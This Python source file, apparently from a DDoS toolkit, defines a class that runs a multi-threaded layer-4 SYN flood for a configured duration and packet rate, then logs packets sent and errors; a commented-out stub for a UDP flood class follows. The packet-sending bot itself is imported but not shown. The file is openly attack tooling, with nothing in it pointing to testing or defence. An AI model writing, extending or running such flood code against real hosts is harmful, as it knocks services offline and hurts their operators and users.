import time, datetime
from pathlib import Path

from ddos.bots.l4_bot import L4SYNBot
from ddos.utils import load_json, save_jsonl

ddos_config = load_json(Path(__file__).resolve().parents[2] / "config/l4ddos.json")
LOGS = Path(__file__).resolve().parents[2] / "logs/l4attack.jsonl"
DURATION = ddos_config["l4"]["DURATION"]


class L4SYNAttack:
    def __init__(self, pps: int | None = None):
        self.duration = DURATION
        self.pps = pps
        self.stats = {
            "packets_sent": 0,
            "pps_achieved": 0,
            "errors_count": 0
        }

    def attack(self, num_threads: int = 8):
        print("⏳ L4 SYN Attack is running...")
        start_time = time.time()
        stop_time = time.time() + self.duration

        bots = []
        for i in range(num_threads):
            bot = L4SYNBot(stop_time=stop_time, num=i, pps=self.pps)
            bots.append(bot)
            bot.start()
        for bot in bots:
            bot.join()
            self.stats["packets_sent"] += bot.local_packets_sent
            self.stats["errors_count"] += bot.local_errors_count

        print("✅ L4 SYN Attack finished.")
        total_duration = time.time() - start_time
        self.attack_statistic_save(thrds_num=num_threads, total_duration=total_duration)
        self.attack_statistic_clear()

    def attack_statistic_save(self, thrds_num: int, total_duration):
        if total_duration > 0:
            self.stats["pps_achieved"] = self.stats["packets_sent"] / total_duration
        logs = {
            f"{datetime.datetime.now():%Y-%m-%d %H:%M:%S.%f}": {
                "---PARAMS---": {
                    "Pps lim": self.pps,
                    "Threads number": thrds_num
                },
                "---STATS---": {
                    "Packets Sent": self.stats["packets_sent"],
                    "Pps": self.stats["pps_achieved"],
                    "Errors": self.stats["errors_count"]
                }
            }
        }
        save_jsonl(LOGS, logs, show=True)

    def attack_statistic_clear(self):
        self.stats = {
            "packets_sent": 0,
            "pps_achieved": 0,
            "errors_count": 0
        }

'''
class L4UDPAttack:
    def __init__(self):
        self.target_ip = TARGET_IP
        self.target_port = TARGET_PORT
        self.pps = PPS
        self.duration = DURATION
        self.analyses = {
            "packets_sent": 0,
            "pps_achieved": 0,
            "bytes_send": 0,
            "errors_count": 0
        }'''